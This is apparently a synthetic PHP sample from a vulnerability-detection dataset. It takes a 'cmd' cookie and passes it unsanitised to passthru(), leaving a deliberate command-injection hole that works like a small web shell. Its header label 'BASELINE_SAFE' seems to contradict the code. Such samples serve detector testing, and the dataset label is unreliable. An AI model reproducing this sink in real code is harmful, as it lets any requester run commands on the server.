<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=COOKIE; CE_MODE=FILTER_INPUT_COOKIE; SKELETON=S3; KEY=cmd; SINK=B4; VAR=v0077 */
function SINK_B4($command){
    passthru($command);
}
$inp = (string)(filter_input(INPUT_COOKIE, "cmd") ?? "");
$inp = (string)$inp; // no value processing
$f = function($x){
    return SINK_B4($x);
};
$out = $f($inp);
echo (string)($out);
?>
